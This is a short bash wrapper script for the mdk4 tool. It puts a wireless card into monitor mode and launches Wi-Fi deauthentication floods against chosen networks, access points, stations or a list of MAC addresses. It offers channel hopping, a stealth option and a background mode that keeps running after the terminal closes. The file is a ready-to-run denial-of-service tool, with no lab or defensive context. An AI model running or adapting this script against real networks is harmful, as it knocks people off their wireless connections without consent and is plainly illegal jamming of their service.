#!/bin/bash

if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    echo "mdk4 deauth wrapper script"
    echo "set environment variables accordingly"
    echo "CSURF    c,c,c,c,c            channels to hop"
    echo "CSPEED   1234                 channel hop speed"
    echo "SNEAK    any                  use -x"
    echo "WIFI     essid                essid to attack"
    echo "AP       mac                  ap bssid to attack"
    echo "STA      mac                  station bssid to attack"
    echo "MACLIST  file.txt             list of bssid's to attack"
    echo "BG       any                  nohup and background"
    exit 0
fi

if [ -z "$CSURF" ]; then
    CSURF="1,6,11,36,40,44,48,149,153,157,161"   # channels I see more often than not
fi
if [ -z "$CSPEED" ]; then
    CSPEED="500"
fi
if [ "$SNEAK" ]; then
    MOREFLAGS="-x"
fi
if [ "$WIFI" ]; then
    MOREFLAGS="$MOREFLAGS -E $WIFI"
fi
if [ "$AP" ]; then
    MOREFLAGS="$MOREFLAGS -B $AP"
fi
if [ "$STA" ]; then
    MOREFLAGS="$MOREFLAGS -S $STA"
fi
if [ "$MACLIST" ]; then
    MOREFLAGS="-b $MACLIST"
fi
if [ "$BG" ]; then
    PREFIX="nohup"
    SUFFIX="2>&1 &"
fi

airmon-ng | grep wlan1mon > /dev/null

if [ -z "$TRUSTMON" ]; then
  airmon-ng | grep wlan1mon > /dev/null
  if [ $? ]; then
    airmon-ng start wlx9cefd5f60270
  fi
  TRUSTMON="deauth"
  export TRUSTMON
fi

sleep 0.1
ip link show | awk '/ether/ {print $2}' > whitelist.txt
sleep 0.1
echo "Preparing..."
echo "$PREFIX mdk4 wlan1mon d -w whitelist.txt -c $CSURF:$CSPEED  $MOREFLAGS  $SUFFIX"
echo "Executing..."

$PREFIX mdk4 wlan1mon d -w whitelist.txt -c $CSURF:$CSPEED  $MOREFLAGS  $SUFFIX

# mdk4 wlan1mon d -w whitelist.txt -b blacklist.txt -s packetspersecond -x [full ids stealth] -c chan,chan,chan:speed -E ESSID -B BSSID -S stationBSSID -W whitelistedBSSID
